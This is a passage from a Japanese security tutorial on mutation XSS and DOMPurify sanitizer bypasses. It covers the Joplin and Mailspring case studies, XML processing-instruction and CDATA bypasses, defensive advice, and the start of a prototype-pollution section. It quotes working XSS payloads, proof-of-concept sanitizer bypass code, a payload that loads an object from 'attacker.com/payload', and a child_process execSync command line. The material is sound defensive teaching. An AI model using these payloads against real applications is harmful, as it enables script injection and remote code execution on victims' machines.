- **なぜ動くのか**: サニタイザ内部の `DOMParser` はスクリプト無効とみなすため、`<noscript>` の中身を raw text として扱い、`</noscript>` までをテキストとして素通しする。実ページはスクリプト有効なので、同じ文字列を再パースすると `<noscript>` の中身がHTMLとして再解釈され、`<style>` の後の `</noscript>` で `<noscript>` が閉じ、`<img onerror>` が本物の要素として出現・発火する。

#### 例3: Form + MathML + Style（Parsing Round Trip）

```html
<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
```

- **なぜ動くのか**: `<form>` の入れ子不可ルールにより、1回目のパースと再パースで `</form>` の効き方が変わる。`<mtext>` は MathMLテキスト統合点、`<mglyph>` はその直下で MathML 名前空間に留まる例外要素。`<style>` が MathML の foreign content 内にあるため raw text ではなくなり、`</math>` で名前空間が HTML に戻った後の `<img onerror>` が本物の要素として解釈される。複数のパース癖を直列に積み上げた高度なベクタ。

#### 例4: SVG × Style × 属性値（名前空間混同の典型）

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

- **なぜ動くのか**: SVG 名前空間内の `<style>` は raw text 要素ではない。したがって `<a>` の `alt` 属性値に含まれる `</style>` が、シリアライズ→再パースの過程で本物の閉じタグとして機能し、続く `<img onerror>` が HTML 要素として出現する。後述の Joplin（CVE-2023-33726）はまさにこのペイロードで攻略された。

#### 例5: DOMPurify < 2.0.17 名前空間混同（Michał Bentkowski）

```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
```

- **なぜ動くのか**: `<form>` の入れ子と MathML/SVG の名前空間切り替えを組み合わせ、DOMPurify のパースと実ブラウザのパースで `<style>` の閉じ位置と要素の所属名前空間がズレるように仕組む。DOMPurify（2.0.17 未満）は `<style>` の中身を raw text として安全と判断するが、シリアライズ→再パースの過程で `</style>` が本物の閉じタグとして効き、`<img onerror>` が独立したHTML要素として蘇る。

> 出典: Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html

#### 例6: DOMPurify < 2.2.2「From SVG and back」（Daniel Santos）

```html
<svg></p><textarea><title><style></textarea><img src=x onerror=alert(1)></style></title></svg>
```

- **なぜ動くのか**: `<svg>` で SVG 名前空間に入ると `<style>` の子孫は通常のHTMLとして描画されうる。`</p>` や `<textarea>`/`<title>`（RCDATA要素）を挟んでパース状態を意図的にずらし、SVG から HTML へ"戻る"境界の解釈差で `<img onerror>` を実体化させる。DOMPurify 2.2.2 で修正。

> 出典: From SVG and back, yet another mutation XSS via namespace confusion for DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f

---

### ケーススタディ①: Joplin（CVE-2023-33726）―― mXSS から任意コマンド実行へ

**Joplin** はオープンソースのノートアプリで、Electron（Chromiumベースのデスクトップアプリケーションフレームワーク）上で動作します。

#### 脆弱性の原因

Joplin はHTMLサニタイズに **htmlparser2** という npm パッケージを使用していました。このパッケージは **「仕様準拠よりも速度を優先する（doesn't follow the specification and prefers speed over accuracy）」** という設計方針をとっており、ブラウザの HTML パーサとは異なる解釈をするケースがありました。

#### 攻撃ペイロード

```html
<svg><style><a alt="</style><img src=x onerror=alert(1)>">
```

htmlparser2 はこの入力を解析する際、SVG 名前空間内の `<style>` を HTML 名前空間と同様に raw text として扱い、中身をただのテキストと判断しました。しかし Electron（Chromium）のHTMLパーサは仕様に忠実に SVG 内の `<style>` を foreign content として扱うため、`</style>` が閉じタグとして機能し、`<img onerror>` が本物の要素として出現しました。

#### 影響範囲

Joplin は Electron 上で動作し、Node.js へのアクセス権限を持っていたため、mXSS による JavaScript 実行は **任意のコマンド実行（RCE: Remote Code Execution）** に直結しました。ノートアプリに悪意のあるHTMLを含むノートを共有するだけで、被害者のマシン上で任意のコマンドが実行される危険がありました。

この事例は、mXSS が単なる「ブラウザでアラートが出る」レベルの問題ではなく、デスクトップアプリでは **OS レベルの侵害に直結する** ことを明確に示しています。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### ケーススタディ②: Mailspring ―― mXSS → サンドボックス脱出 → RCE

Sonar が発見した Mailspring（デスクトップメールクライアント、Electron製）の脆弱性は、mXSS を起点とした多段階の攻撃チェーンで **RCE（任意コマンド実行）** に至った事例です。

#### 攻撃チェーンの全体像

**ステップ1 ―― mXSS（SVG/style のパーサ差分）:**
攻撃者は SVG 内の `<style>` を利用した mXSS ペイロードを含むメールを送信します。

**ステップ2 ―― サンドボックスの初期防御:**
メールの初回表示時は、コンテンツがサンドボックス化された iframe 内にレンダリングされるため、JavaScript は実行されません。

**ステップ3 ―― 返信/転送によるサンドボックス脱出:**
被害者がそのメールに**返信または転送**すると、メール本文がサンドボックスの外で再レンダリングされます。この再レンダリング時に mXSS による変異が発生し、JavaScript が実行可能になります。

**ステップ4 ―― CSP バイパスと二次サニタイズの回避:**
Mailspring の CSP（Content Security Policy）には設定ミスがあり、`<object>` タグが許可されていました。さらに、`<signature>` タグ（Mailspring 独自のカスタム要素）を使うことで二次的なサニタイズ処理を回避できました。

最終的なペイロード:

```html
<svg><style><a title="</style><signature><object data='attacker.com/payload'></object></signature>">
```

**ステップ5 ―― RCE への到達:**

2つの経路が存在しました。

- **経路A（Electron の既知脆弱性）**: Mailspring は Electron 17.4.0（Chrome 98 ベース）を使用しており、**CVE-2022-1364**（Chrome の型混同脆弱性）に対して脆弱でした。
- **経路B（CSS による情報窃取 → ファイルアクセス → コマンド実行）**: CSS の `url()` を使って添付ファイルのパスを外部に漏洩させ、same-origin のファイルアクセスを経由して `top.require('child_process').execSync('arbitrary_command')` により任意のコマンドを実行しました。

#### タイムライン

- 2023年4月27日: Sonar が初回報告
- 2023年7月4日: ベンダー承認
- 2023年7月29日: CSP の強化パッチ適用
- 2024年3月9日: Sonar がブログ記事を公開

影響を受けたバージョンは **Mailspring 1.11.0 未満** です。

この事例が示す教訓は明確です。**mXSS 単体は JavaScript 実行に過ぎないが、Electron アプリの特権的な実行環境、CSP の設定ミス、古いランタイムの既知脆弱性が連鎖すると、1通のメールで被害者のマシンを完全に掌握できる。**

> 出典: Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/

---

### DOMPurify バイパスの歴史とバージョン依存（陳腐化への注意）

mXSS ペイロードは**サニタイザのバージョンに強く依存**します。以下は DOMPurify（最も広く使われるクライアントサイド・サニタイザ）の主要な mXSS 関連バイパスと修正の時系列です。

| 時期 | バイパスの種類 | 影響バージョン | 修正バージョン | 備考 |
|---|---|---|---|---|
| 2020 | MathML 名前空間混同（Bentkowski, 例5） | < 2.0.17 | **2.0.17** | 親名前空間の検証を導入 |
| 2020 | SVG 名前空間混同「From SVG and back」（Santos, 例6） | < 2.2.2 | **2.2.2** | SVG→HTML 境界の解釈差 |
| 2020–2021 | 追加の名前空間/mglyph 系（2.2.x で継続的に修正） | 2.2.x 系 | 2.2.3 / 2.2.4 / 2.2.6 ほか | いたちごっこが続いた時期 |
| 2024公開 | **ネスト（入れ子）ベース mXSS**（CVE-2024-47875） | 修正前の全般 | **2.5.0 / 3.1.3** | 深い入れ子で再パース挙動が発散 |
| 2025公開 | **テンプレートリテラル正規表現の不備**（CVE-2025-26791） | < 3.2.4 | **3.2.4** | `SAFE_FOR_TEMPLATES: true` 時のみ |
| 2025公開 | **`<textarea>` raw text 検証漏れ**（CVE-2025-15599） | 3.1.3–3.2.6 / 2.5.3–2.5.8 | **3.2.7**（3.x 系） | 2.x 系は未修正のまま |

**実務上の教訓:**

- **常に最新の DOMPurify へ更新する。** mXSS 修正は"追いつき"の連続であり、古い版に固定するとその後に発見された回避に必ず晒される。
- **2.x 系は一部 CVE（例: CVE-2025-15599）が未修正のまま**。2.x を継続利用しているプロジェクトは 3.x への移行を検討すべき。
- **非デフォルト設定は攻撃面を広げる**。`SAFE_FOR_TEMPLATES`（CVE-2025-26791）や `SAFE_FOR_XML`（CVE-2025-15599）のように、既定から外れたオプションが新たなバイパスの入口になった例が複数ある。

#### mXSS の影響を受けた他のサニタイザ

DOMPurify だけが mXSS の標的ではありません。Sonar の記事では以下のサニタイザにも脆弱性があったことが言及されています。

- **HtmlSanitizer**（CVE-2023-44390）
- **TYPO3**（CVE-2023-38500）
- **OWASP java-html-sanitizer**
- **Mozilla bleach**
- **Google Caja**
- **DOMPurify 2.0.0**

これらに共通するのは、**パーサの実装がブラウザのパーサと完全には一致しない** という構造的な問題です。

> 出典: Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History

---

### 防御策のまとめ

mXSS への対策は「サニタイザを信じきる」ことではなく、「**パーサ差分が生まれないように処理フロー全体を設計する**」ことです。Sonar の記事が推奨する防御策を軸に整理します。

#### 1. クライアントサイド・サニタイズ（最重要）

**描画するのと同じブラウザ上でサニタイズする。** サーバサイドのサニタイズは配信先ブラウザの多様さゆえにパーサ差分を排除できず、mXSS に構造的に弱い。クライアントサイド・サニタイザ（DOMPurify 等）を使えば、サニタイズとレンダリングが同じパーサで行われるため差分が最小化されます。

#### 2. 再パースの回避

**サニタイズ済みのDOMツリーを直接挿入する。** サニタイズ結果をHTML文字列にシリアライズしてから `innerHTML` で再挿入するのではなく、DOMツリーそのものを挿入すれば、シリアライズ→再パースのラウンドトリップで生じる変異を回避できます。

#### 3. サニタイズ後のエンコード

サニタイズ後にHTMLを文字列として扱う必要がある場合は、**raw content をエンコードする**。サニタイズ済み文字列に対して後から加工・連結・再パースを行わない（desanitization の回避）。

#### 4. Foreign content の制限

ユーザーHTMLに SVG/MathML を許可する必要がなければ、**SVG/MathML 要素を丸ごと削除する**。名前空間切り替えが発生しなければ、mXSS の最大の攻撃面が消滅します。

#### 5. 文脈の一貫性

サニタイザがフラグメントを解析する文脈と、アプリケーションがそのHTMLを埋め込む文脈を一致させる。たとえば、HTML 文脈でサニタイズしたHTMLを SVG 内に挿入しないようにする。

#### 6. Sanitizer API（ブラウザネイティブのサニタイズ）

**WICG（Web Incubator Community Group）で策定中の Sanitizer API** は、ブラウザ自身が提供するネイティブのサニタイズ機能です。ブラウザのパーサと完全に同じパーサでサニタイズが行われるため、パーサ差分の問題が原理的に解消されます。標準化が進めば、mXSS に対する最も根本的な解決策になり得ます。

#### 7. 多層防御

サニタイザは万能ではないことを前提に、以下を重ねます。

- **CSP（Content Security Policy）** で `script-src` を厳格化し、`'unsafe-inline'` を排除する。nonce/hash 方式を採用する。
- **Trusted Types** で `innerHTML` への生文字列代入を型レベルで禁止する。
- サニタイザは**常に最新版**を使い、依存の自動更新（Dependabot / Renovate 等）を運用に組み込む。

> 出典: mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/

---

### このセクションの要点（まとめ）

- mXSS の核心は **「サニタイザの目には raw text、ブラウザの目には HTML」** となる文字列を作ること。バグではなく**パーサ差分（parser differential）**という仕様レベルの落とし穴を突く。
- Sonar は mXSS を **4つのパターン** に分類した: **Parser Differentials（パーサ差分）**、**Parsing Round Trip（パース往復）**、**Desanitization（脱サニタイズ）**、**Context-Dependent Parsing（文脈依存パース）**。
- SonarSource mXSS チートシートは、HTML/SVG/MathML の各名前空間における要素の予期しない挙動（foster parenting、form の入れ子不可、foreign content breaker 等）を網羅的に整理した実務資料。
- **Joplin（CVE-2023-33726）** は、仕様非準拠のパーサ（htmlparser2）と Electron の Node.js 権限の組み合わせにより、mXSS が RCE に直結した事例。
- **Mailspring** は、mXSS → 返信/転送によるサンドボックス脱出 → CSP バイパス → RCE という多段階の攻撃チェーンで、1通のメールからマシンを掌握できた事例。
- 防御の中核は **クライアントサイド・サニタイズ**（同一パーサで無害化）、**再パースの回避**（DOMツリーの直接挿入）、**foreign content の制限**、**Sanitizer API への移行**。サニタイザの最新化と多層防御（CSP、Trusted Types）を必ず重ねる。

---

### 出典一覧

- mXSS: The Vulnerability Hiding in Your Code（Sonar） — https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/
- SonarSource / mxss-cheatsheet（GitHub / GitHub Pages） — https://github.com/SonarSource/mxss-cheatsheet / https://sonarsource.github.io/mxss-cheatsheet/
- mXSS Explained（SonarSource） — https://sonarsource.github.io/mxss-cheatsheet/explained/
- Reply to Calc: The Attack Chain to Compromise Mailspring（Sonar） — https://www.sonarsource.com/blog/reply-to-calc-the-attack-chain-to-compromise-mailspring/
- mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations（Heiderich et al., ACM CCS 2013） — https://cure53.de/fp170.pdf
- Mutation XSS via namespace confusion – DOMPurify +2.0.17 bypass（Michał Bentkowski / Securitum） — https://www.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass.html
- From SVG and back … DOMPurify < 2.2.2 bypass（Daniel Santos） — https://vovohelo.medium.com/from-svg-and-back-yet-another-mutation-xss-via-namespace-confusion-for-dompurify-2-2-2-bypass-5d9ae8b1878f
- Attack Classes & Bypass History（cure53/DOMPurify Wiki） — https://github.com/cure53/DOMPurify/wiki/Attack-Classes-&-Bypass-History
- Code Vulnerabilities Put Skiff Emails at Risk（Sonar） — https://www.sonarsource.com/blog/code-vulnerabilities-put-skiff-emails-at-risk

## mXSS補足: XMLパーサ差分によるDOMPurifyバイパス

本節では、前節までに学んだmXSS（Mutation XSS）の原理を踏まえ、**HTMLパーサとXMLパーサの構文解釈の違い**を突いたDOMPurifyバイパスの実例を深掘りする。主題となるのは、Flatt Security（現 GMO Flatt Security）のセキュリティエンジニアRyotaK氏が2024年4月に公開した研究「Bypassing DOMPurify with good old XML」である。この研究は、DOMPurifyの**XMLパースモード**において、Processing Instruction（処理命令）とCDATAセクションという2つのXML固有構文がmXSSベクタとなることを実証し、2段階にわたるバイパスと修正の攻防を記録した貴重な事例である。

> **サニタイザが見ている「木構造」と、ブラウザが最終的に描画する「木構造」が食い違うと、その差分がXSSになる。**

この一文が、本節で扱うすべての事例の共通原理である。

---

### 1. 背景: DOMPurifyのXMLパースモード

DOMPurifyは通常、入力をHTMLとしてパースする（`text/html`）。しかし`PARSER_MEDIA_TYPE`オプションに`"application/xhtml+xml"`を指定すると、内部で**XMLパーサ**（`DOMParser`のXMLモード）を使ってDOMツリーを構築する。XHTML準拠のアプリケーション、あるいはSVGやMathMLを多用する環境では、このモードが選択されることがある。

問題は、DOMPurifyがXMLパーサで構築したDOMツリーをサニタイズし、結果をシリアライズ（文字列化）した後、その文字列がアプリケーション側で`innerHTML`経由――つまり**HTMLパーサ**によって――再パースされるケースである。XMLパーサとHTMLパーサは構文の解釈規則が根本的に異なるため、同じ文字列が異なるDOMツリーに変換されうる。これがmXSSの温床となる。

RyotaK氏の研究は、セキュリティ研究者 @slonser\_ が発見したDOMPurifyの先行バイパスに対するパッチを調査する中で、**追加の2つのバイパス**を発見したという経緯で始まった。

---

### 2. 第1のバイパス: Processing Instruction（処理命令）の解釈差（DOMPurify 3.0.10）

#### Processing Instructionとは

XMLには**Processing Instruction（PI、処理命令）**と呼ばれる構文がある。形式は次の通りだ。

```
'<?' PITarget (S (Char* - (Char* '?>' Char*)))? '?>'
```

つまり `<?` で始まり、ターゲット名（PITarget）が続き、`?>` で終端する。XMLパーサはこの全体を1つのProcessing Instructionノードとして扱い、中身にどんな文字列が含まれていてもマークアップとしては解釈しない。

#### HTMLパーサにおける `<?` の扱い: bogus comment

HTMLの仕様にはProcessing Instructionという概念がない。HTMLパーサが `<?` に遭遇すると、HTML仕様のトークナイゼーション規則により**bogus comment state（不正なコメント状態）**に遷移する。bogus commentの終端は `?>` ではなく、**最初に出現する `>`（山括弧）** である。

この差が致命的な食い違いを生む。

#### 解釈差の具体例

次の文字列を考える。

```
<?xml-stylesheet ><h1>Hello</h1> ?>
```

**XMLパーサの解釈:**

XMLパーサにとって、これは `<?xml-stylesheet` で始まるPI全体（`?>` まで）が1つのノードである。`<h1>Hello</h1>` はPIの内部テキストに過ぎず、タグとしては認識されない。結果として、DOMツリーには**ProcessingInstructionノードが1つだけ**存在する。

**HTMLパーサの解釈:**

HTMLパーサにとって、`<?xml-stylesheet ` は bogus comment の開始であり、最初の `>` で即座にコメントが閉じる。つまり `<?xml-stylesheet >` がコメント部分となり、それ以降の `<h1>Hello</h1> ?>` は**通常のHTMLマークアップとして解釈**される。`<h1>` タグが生きた要素として出現する。

#### バイパスの実証

DOMPurify 3.0.10において、この解釈差を利用した以下のPoCが成立した。

```javascript
document.documentElement.innerHTML = DOMPurify.sanitize(
  "<?img ><img src onerror=alert(1)>?",
  { PARSER_MEDIA_TYPE: "application/xhtml+xml" }
);
```

**攻撃の流れ:**

1. DOMPurifyはXMLパーサで入力をパースする。`<?img ><img src onerror=alert(1)>?` 全体が `<?img` をターゲットとするProcessing Instructionノードとなる（終端の `>?` はXML的には `?>` の前に `>` があるだけで、PIの内部テキスト）。
2. DOMPurifyのサニタイズロジックはこのPIノードを走査するが、当時のバージョンでは**Processing Instructionノードに対する除去処理が実装されていなかった**。PIの中身はテキストとして扱われるため、`<img onerror=...>` は要素ノードとしては存在せず、サニタイザの目には無害に映る。
3. サニタイズ後の文字列がシリアライズされ、`innerHTML`（HTMLパーサ）に渡される。
4. HTMLパーサは `<?img >` の時点でbogus commentを閉じ、続く `<img src onerror=alert(1)>` を**通常のHTML要素として解釈**する。
5. `onerror` イベントハンドラが発火し、`alert(1)` が実行される。

---

### 3. 最初のパッチとnodeName混同

DOMPurifyの開発チームはこのバイパスを受け、Processing Instructionノードをフィルタリングするパッチを適用した。具体的には、ツリーウォーカーの`whatToShow`に`NodeFilter.SHOW_PROCESSING_INSTRUCTION`フラグを追加し、PIノードがサニタイズ対象として走査されるようにした。

しかし、この修正には**仕様由来の落とし穴**があった。

#### nodeNameの仕様

DOM仕様では、各ノードタイプの`nodeName`プロパティが返す値は次のように定義されている。

| ノードタイプ | `nodeName` の返り値 |
|---|---|
| Element | タグ名（`"div"`, `"img"` 等） |
| Text | `"#text"` |
| Comment | `"#comment"` |
| **ProcessingInstruction** | **そのターゲット名（PITarget）** |

ここで重要なのは、ProcessingInstructionノードの`nodeName`は`"#processing-instruction"`のような固定値ではなく、**PITargetの文字列そのものを返す**という点である。

つまり `<?img ?>` というPIの`nodeName`は `"img"` になる。

#### nodeName混同によるバイパス継続

DOMPurifyのサニタイズロジックは、ノードの`nodeName`を許可リスト（allowed tags）と照合して、許可されたタグかどうかを判定する。PIノードが走査対象に加わっても、`<?img ?>` のnodeNameは `"img"` であり、`<img>` はDOMPurifyの既定許可リストに含まれている。その結果、PIノードは「許可されたタグである」と誤判定され、**除去されずに残存した**。

つまり最初のパッチは、PIノードを「見る」ようにはなったが、PIノードと通常のElement要素を**nodeNameだけでは区別できない**という仕様上の特性により、実質的にバイパスが継続した。

---

### 4. 第2のパッチ: Processing Instructionの完全除去

この問題を根本的に解決するため、DOMPurifyは**ノードタイプによる判定**を追加した。

```javascript
if (currentNode.nodeType === 7) {
  _forceRemove(currentNode);
  return true;
}
```

`nodeType === 7` はProcessing Instructionノードを示す定数であり、nodeNameの内容にかかわらず、PIノードであれば無条件に除去する。これにより、Processing Instructionを利用したバイパスは塞がれた。

---

### 5. 第2のバイパス: CDATAセクションの解釈差（DOMPurify 3.0.11）

PIの問題が修正されたDOMPurify 3.0.11に対し、RyotaK氏は**CDATAセクション**という別のXML固有構文を用いた第2のバイパスを発見した。

#### CDATAセクションとは

XMLにおけるCDATAセクションは、以下の形式でテキストをリテラル（文字通り）に保持する構文である。

```
<![CDATA[ ... ]]>
```

`<![CDATA[` と `]]>` で囲まれた内容は、XMLパーサによって**エスケープ処理なしの生テキスト**として扱われる。内部に `<` や `&` が含まれていても、マークアップやエンティティ参照としては解釈されない。

#### HTMLパーサにおけるCDATAの扱い

HTMLパーサはCDATAセクションを**ネイティブには認識しない**。ただし、HTML仕様には名前空間に応じた分岐規則がある。

HTML仕様のトークナイゼーション規則には次のように定義されている。

> **"If there is an adjusted current node and it is not an element in the HTML namespace, switch to the CDATA section state. Otherwise, this is a parse error. Create a comment token... Switch to the bogus comment state."**

つまり:

- **SVG/MathML名前空間内**（非HTML名前空間）: CDATAセクションとして正しく認識される。
- **HTML名前空間内**: `<![CDATA[` はパースエラーとなり、**bogus comment state** に遷移する。bogus commentの終端は（PIの場合と同様に）**最初に出現する `>`** である。

#### 解釈差の具体例

次の文字列を考える。

```
<![CDATA[ ><img src onerror=alert(1)> ]]>
```

**XMLパーサの解釈:**

`<![CDATA[` から `]]>` までが1つのCDATAセクションノードであり、内部の `><img src onerror=alert(1)>` は単なるテキストとして扱われる。タグとしては認識されない。

**HTMLパーサの解釈（HTML名前空間内）:**

`<![CDATA[` はbogus commentの開始となり、最初の `>` で即座にコメントが閉じる。つまり `<![CDATA[ >` がコメント部分であり、続く `<img src onerror=alert(1)>` は**通常のHTMLマークアップとして生きた要素になる**。残りの ` ]]>` はテキストノードとして処理される。

#### バイパスの実証

DOMPurify 3.0.11において、以下のPoCが成立した。

```javascript
document.documentElement.innerHTML = DOMPurify.sanitize(
  "<![CDATA[ ><img src onerror=alert(1)> ]]>",
  { PARSER_MEDIA_TYPE: "application/xhtml+xml" }
);
```

**攻撃の流れ:**

1. DOMPurifyはXMLパーサで入力をパースする。全体が1つのCDATAセクションノードとなり、内部はテキスト扱い。
2. DOMPurifyのサニタイズロジックはCDATAセクションノードを走査するが、3.0.11時点では**CDATAセクションノードに対する除去処理が未実装**だった（PIの修正で追加されたのは `nodeType === 7` の判定のみで、CDATAセクションは `nodeType === 4` という別の値を持つ）。
3. サニタイズ後の文字列がシリアライズされ、`innerHTML`（HTMLパーサ）に渡される。
4. HTMLパーサはHTML名前空間で `<![CDATA[ >` をbogus commentとして処理し、続く `<img src onerror=alert(1)>` を通常の要素として構築する。
5. `onerror` が発火し、任意のJavaScriptが実行される。

---

### 6. 最終パッチ: CDATAセクションの完全除去

DOMPurifyはこの報告を受け、ツリーウォーカーに`NodeFilter.SHOW_CDATA_SECTION`フラグを追加し、CDATAセクションノードも走査・除去の対象とした。

PIの場合と異なり、CDATAセクションノードの`nodeName`は仕様上`"#cdata-section"`という固定文字列を返す。この値はDOMPurifyの許可リスト上のどのタグ名とも一致しないため、nodeName混同によるバイパスは成立しない。したがって、CDATAセクションについてはnodeTypeによる追加判定がなくても、`NodeFilter.SHOW_CDATA_SECTION`で走査対象に含めるだけで正しく除去できた。

---

### 7. 2つのバイパスの技術的対比

| | 第1のバイパス（PI） | 第2のバイパス（CDATA） |
|---|---|---|
| **対象バージョン** | DOMPurify 3.0.10 | DOMPurify 3.0.11 |
| **XML構文** | `<?target ... ?>` | `<![CDATA[ ... ]]>` |
| **XMLパーサの解釈** | PIノード1つ（内部はテキスト） | CDATAノード1つ（内部はテキスト） |
| **HTMLパーサの解釈** | bogus comment（`>` で終端）→ 後続がマークアップ化 | bogus comment（`>` で終端）→ 後続がマークアップ化 |
| **nodeType** | 7（PROCESSING_INSTRUCTION_NODE） | 4（CDATA_SECTION_NODE） |
| **nodeName** | PITargetの文字列（タグ名と衝突しうる） | `"#cdata-section"`（固定、衝突しない） |
| **修正方法** | `nodeType === 7` による無条件除去 | `SHOW_CDATA_SECTION` による走査追加 |
| **nodeName混同リスク** | あり（`<?img ?>` → nodeName `"img"`） | なし |

両バイパスに共通するのは、**HTMLのbogus comment stateの終端規則**（`>` で閉じる）とXML構文の終端規則（`?>` または `]]>`で閉じる）のズレを利用している点である。この食い違いにより、XMLパーサが「1ノードの内部テキスト」として無害と判定した領域の一部が、HTMLパーサでは「コメントの外側」に位置する生きたマークアップとして再解釈される。

---

### 8. 攻撃の前提条件と実際の影響

このバイパスが成立するには、以下の条件が必要である。

1. **DOMPurifyがXMLパースモードで使用されている**: `PARSER_MEDIA_TYPE: "application/xhtml+xml"` が設定されていること。デフォルトの `text/html` モードのみを使用するアプリケーションは影響を受けない。
2. **サニタイズ結果がHTMLコンテキストで挿入される**: `innerHTML` や `outerHTML` など、HTMLパーサによる再パースが発生する形で出力されること。

条件が限定的に見えるかもしれないが、XHTMLベースのアプリケーション、SVG/MathMLを多用するリッチテキストエディタ、あるいはサーバサイドでXMLとしてサニタイズしたHTMLをクライアントに送信する構成などでは、この条件を満たしうる。影響はフルXSS（任意のJavaScript実行）であり、深刻度は高い。

---

### 9. HackerOne #1024734: DOMPurifyの名前空間混同バイパス

RyotaK氏の研究がXML/HTMLパーサ間の**構文差**（PI、CDATA）を突くものであったのに対し、mXSSには**名前空間混同（namespace confusion）**という別の大きな攻撃クラスが存在する。HackerOneレポート#1024734（報告者: Daniel Santos）は、DOMPurify 2.2.2未満に存在したこの系統の脆弱性を報告したものである。

名前空間混同の核心は、HTML5パーシングアルゴリズムにおける**integration point（統合点）**の扱いにある。`<svg>` や `<math>` 要素の内部では、パーサはそれぞれSVG名前空間・MathML名前空間で解析を行うが、`<mglyph>` や `<mtext>` などの特定要素は**HTML integration point**として機能し、その子要素はHTML名前空間で解析される。このHTML名前空間への「復帰」のタイミングについて、サニタイザのツリー走査ロジックとブラウザの実際のパース挙動がずれていると、サニタイザが「まだ外来名前空間（SVG/MathML）の中にいる」と判定した要素が、ブラウザ描画時には「すでにHTML名前空間に戻っている」ことになり、HTMLのイベントハンドラとして有効化されてしまう。

DOMPurifyはこの報告を含む一連のフィードバックを受け、名前空間遷移の追跡ロジックを複数バージョンにわたって強化している。名前空間混同系のmXSSは2020年から2025年にかけて継続的に報告・修正が行われた長期的な攻撃クラスであり、このレポートはその初期の事例にあたる。

> 出典: Internet Bug Bounty DOMPurify バイパス報告 #1024734 — https://hackerone.com/reports/1024734

---

### 10. mXSSの先にあるもの: Electron RCEへの展開

mXSSの影響は「Webページ上でJavaScriptが実行される」ことにとどまらない。Electronアプリケーション（デスクトップメールクライアント、チャットアプリ、ノートアプリなど）では、レンダラプロセスがNode.js APIへのアクセスを持つ場合がある。このような環境でmXSSによるXSSが成立すると、`require('child_process').exec(...)` のようなコードを注入でき、**リモートコード実行（RCE）**に直結する。

前節（s4d）で扱ったMailspringのmXSSは、まさにこのパターンの実例であった。HTMLメール内のサニタイズ不備がmXSSを引き起こし、Electron環境でのRCEに至った事例である。DOMPurifyバイパスの研究が重要なのは、こうした「XSSの先にある被害」を見据えた上で、サニタイザの信頼性がセキュリティチェーン全体の要になっているからである。

---

### まとめ: 本節の教訓

| 資料 | 食い違いの発生源 | 悪用されたパーサ間の差 |
|---|---|---|
| Flatt（RyotaK）PI | XMLパースモード vs HTML再パース | PIの終端: `?>` vs bogus commentの `>` |
| Flatt（RyotaK）CDATA | XMLパースモード vs HTML再パース | CDATAの終端: `]]>` vs bogus commentの `>` |
| HackerOne #1024734 | SVG/MathML名前空間 vs HTML名前空間 | integration pointでの名前空間復帰タイミング |

いずれも「サニタイザがパースした瞬間のコンテキスト」と「ブラウザが最終的に描画する瞬間のコンテキスト」が一致していない、という一点に帰着する。防御側の一般原則は次の通りだ。

- **サニタイズと最終挿入を同一のパース経路で完結させる**: 文字列化（シリアライズ）を挟まず、`RETURN_DOM` / `RETURN_DOM_FRAGMENT` オプションでDOMノードのまま扱う。
- **サニタイザのバージョンを常に最新化する**: PI混同、CDATA混同、名前空間混同といった既知のmXSSクラスへのパッチを確実に追随する。
- **Trusted Typesを併用する**: 「サニタイズ済み文字列を無条件にinnerHTMLへ渡す」経路自体を型レベルで制限し、意図しない再パースの入り口を減らす。
- **XMLパースモードの使用を最小限にする**: `PARSER_MEDIA_TYPE: "application/xhtml+xml"` が本当に必要かを検討し、不要であれば既定のHTMLパースモードを使う。これだけでPI/CDATAクラスのバイパスリスクを排除できる。

> 出典: RyotaK, "Bypassing DOMPurify with good old XML"（Flatt Security, 2024年4月） — https://flatt.tech/research/posts/bypassing-dompurify-with-good-old-xml/

## プロトタイプ汚染 概説とガジェット集

反射型XSSやDOMベースXSSの基本を押さえた読者にとって、次に理解しておくべき攻撃手法が「プロトタイプ汚染（Prototype Pollution）」です。プロトタイプ汚染そのものは直接コードを実行する脆弱性ではありませんが、「script gadget（スクリプトガジェット）」と呼ばれる既存コードパターンと組み合わさることで、深刻なXSSへとエスカレーションします。本節では、プロトタイプ汚染の仕組みそのものから、実際に悪用可能なガジェットの具体例までを体系的に解説します。

### 1. プロトタイプ汚染とは何か

JavaScriptでは、すべてのオブジェクトは「プロトタイプ（prototype）」と呼ばれる別オブジェクトへの隠れた参照を持っており、あるオブジェクトにプロパティが存在しない場合、JavaScriptエンジンはこのプロトタイプ参照をたどってプロパティを探しにいきます。これを「プロトタイプチェーン」と呼びます。すべてのプレーンオブジェクト（`{}` で作られるようなオブジェクト）は、最終的に `Object.prototype` という共通の大元のプロトタイプに行き着きます。

**プロトタイプ汚染**とは、この `Object.prototype`（あるいは特定クラスのプロトタイプ）に、攻撃者が意図しないプロパティを外部から追加・上書きしてしまう脆弱性です。`Object.prototype` は事実上「アプリケーション内の全てのプレーンオブジェクトの共通の親」であるため、ここを汚染すると、汚染箇所とは全く無関係に見えるコード――例えば別のライブラリの内部処理――が汚染されたプロパティを「継承」してしまい、予期しない値を読み取ってしまいます。

```js
// 脆弱なマージ処理の例（再帰的にオブジェクトをマージする関数）
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // key に "__proto__" が来ると危険
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));

